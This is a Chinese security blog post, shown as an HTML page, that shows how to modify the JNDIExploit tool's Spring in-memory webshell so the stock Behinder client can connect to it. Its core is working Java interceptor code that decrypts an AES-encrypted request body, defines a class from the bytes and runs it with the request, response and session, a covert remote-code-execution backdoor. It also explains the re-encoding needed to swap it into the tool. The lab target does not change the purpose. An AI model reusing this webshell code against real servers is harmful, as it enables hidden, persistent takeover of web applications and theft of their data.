@@ -1,0 +1,249 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>二改JNDIExploit的Spring内存马适配冰蝎 | 秋嘞个秋</title>
+<link rel="shortcut icon" href="https://sl3epf.github.io/favicon.ico?v=1704378605844">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://sl3epf.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="二改JNDIExploit的Spring内存马适配冰蝎 | 秋嘞个秋 - Atom Feed" href="https://sl3epf.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+前言
+我们知道https://github.com/WhiteHSBG/JNDIExploit 工具注入的冰蝎内存马是经过改造后的冰蝎，网上并没有改造好的与之适配的冰蝎客户端放出来，原版的冰蝎是连接不上的。
+与其去二改冰蝎的客户端，我们不..." />
+    <meta name="keywords" content="工具,Java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://sl3epf.github.io">
+  <img class="avatar" src="https://sl3epf.github.io/images/avatar.png?v=1704378605844" alt="">
+  </a>
+  <h1 class="site-title">
+    秋嘞个秋
+  </h1>
+  <p class="site-description">
+    弃我去者，昨日之日不可留
+<br/>
+乱我心者，今日之日多烦忧
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              二改JNDIExploit的Spring内存马适配冰蝎
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-30
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://sl3epf.github.io/tag/ct335g5eK/" class="post-tag">
+                  # 工具
+                </a>
+              
+                <a href="https://sl3epf.github.io/tag/_UMJ5ACaV/" class="post-tag">
+                  # Java
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://sl3epf.github.io/post-images/b_uiDGqEw.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <!-- more -->
+<h1 id="前言">前言</h1>
+<p>我们知道https://github.com/WhiteHSBG/JNDIExploit 工具注入的冰蝎内存马是经过改造后的冰蝎，网上并没有改造好的与之适配的冰蝎客户端放出来，原版的冰蝎是连接不上的。<br>
+与其去二改冰蝎的客户端，我们不如直接改这个jndi工具。</p>
+<h1 id="漏洞环境">漏洞环境</h1>
+<p>https://github.com/j3ers3/Hello-Java-Sec<br>
+这个代码审计环境中的jndi注入模块。</p>
+<h1 id="分析">分析</h1>
+<p>我们先用原工具逻辑去打Spring的冰蝎内存马<br>
+也就是对应<code>SpringMemshell</code>模块<br>
+分析代码，这个codeCLass处就是工具用的内存马。<br>
+<img src="https://sl3epf.github.io/post-images/1703942645272.png" alt="" loading="lazy"><br>
+我们将它复制出来，解码成class看看<br>
+<img src="https://sl3epf.github.io/post-images/1703943264159.png" alt="" loading="lazy"><br>
+逻辑很明了，前面的if提供了一个页面回显的马，后面else就是魔改后的冰蝎<br>
+它的密码md5解密后依然是rebeyond，连接需要多加一个<code>X-Options-Ai</code>的请求头，但是为什么还是连不上呢？<br>
+我们要注意有一行<code>Method targetMethod = evilClass.getDeclaredMethod(&quot;equals&quot;, ServletRequest.class, ServletResponse.class);</code><br>
+想起来之前分析冰蝎的马，最后是equals接收了jsp的上下文对象<code>pageContext</code>，有这个获取request和response，而request又可以获取session。有了它们就能执行webshell的操作。<br>
+所以说不能用呢，冰蝎这里是接收一个参数<br>
+<img src="https://sl3epf.github.io/post-images/1704001584739.png" alt="" loading="lazy"><br>
+而jndi工具的equals方法传入的是两个参数。</p>
+<h1 id="改造">改造</h1>
+<p>其实要改也很简单，将其中冰蝎的逻辑换成自己的就行了。<br>
+我们先把原来的<code>DynamicInterceptorTemplate.java</code>拿出来，找到冰蝎的逻辑部分进行修改</p>
+<p>这里还需要知道一个点。暂时没有办法从spring和tomcat中获取pageContext，但是好在新版冰蝎服务端已经不再依赖pageContext，可以看https://github.com/rebeyond/Behinder/issues/151<br>
+我们只需要传入request和response，然后通过HashMap添加<br>
+<img src="https://sl3epf.github.io/post-images/1703949212902.png" alt="" loading="lazy"><br>
+更改代码如下</p>
+<pre><code class="language-java">else if (request.getHeader(this.behinderShellHeader) != null) {
+            try {
+                if (request.getMethod().equals(&quot;POST&quot;)) {
+                    //System.out.println(&quot;QiuQIu&quot;);
+                    HttpSession session = request.getSession();
+                    HashMap pageContext = new HashMap();
+                    pageContext.put(&quot;request&quot;, request);
+                    pageContext.put(&quot;response&quot;,response);
+                    pageContext.put(&quot;session&quot;,session);
+                    k = this.behinderShellPwd;
+                    session.setAttribute(&quot;u&quot;, k);
+                    cipher = Cipher.getInstance(&quot;AES&quot;);
+                    cipher.init(2, new SecretKeySpec((session.getAttribute(&quot;u&quot;) + &quot;&quot;).getBytes(), &quot;AES&quot;));
+                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));// base64解码+AES解密
+                    Method defineClass = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
+                    defineClass.setAccessible(true);
+                    Class evilClass = (Class) defineClass.invoke(this.getClass().getClassLoader(), evilClassBytes, 0, evilClassBytes.length);
+                    evilClass.newInstance().equals(pageContext);
+                    //System.out.println(&quot;QiuYYDS&quot;);
+                    return false;
+                }
+</code></pre>
+<p>然后就是编译然后base64接着替换掉原先的codeClass</p>
+<h1 id="效果">效果</h1>
+<p>原工具打能打通，有cmd的回显但是冰蝎的🐎是连接不上的<br>
+<img src="https://sl3epf.github.io/post-images/1703948603124.png" alt="" loading="lazy"><br>
+改造后<br>
+<img src="https://sl3epf.github.io/post-images/1703949449565.png" alt="" loading="lazy"><br>
+注意，如果你是用我这篇文章的靶场环境，在连接的时候是需要添加cookie参数的。</p>
+<h1 id="总结">总结</h1>
+<p>根据此思路也可以再修改其他的🐎，这次我只是遇到了他不支持spring的冰蝎。tomcat的可以用TomcatMemshell3，这个是支持我们平常用的冰蝎客户端的。<br>
+当然你也可以二改冰蝎去适配jndi工具，我觉得比较麻烦。<br>
+详情可见希谭实验室的文章 https://mp.weixin.qq.com/s/qE_AArdpAVL-EoBbILb_Jg</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">漏洞环境</a></li>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#%E6%94%B9%E9%80%A0">改造</a></li>
+<li><a href="#%E6%95%88%E6%9E%9C">效果</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://sl3epf.github.io/post/iXD_sv0an/">
+              <h3 class="post-title">
+                内存马小记
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Friends: <a href="https://zjackky.github.io/" target="_blank">zjackky</a>&nbsp;<a href="https://jaspersec.top/" target="_blank">jasper</a>&nbsp;<a href="https://zikh26.github.io/" target="_blank">zikh26</a>&nbsp;<a href="http://payioad.com/" target="_blank">payioad</a>&nbsp;
+<a href="http://blog.ldsecurity.cn/" target="_blank">凌度</a>&nbsp;<a href="http://www.aiwin.fun/" target="_blank">aiwin</a>&nbsp;
+  <a class="rss" href="https://sl3epf.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
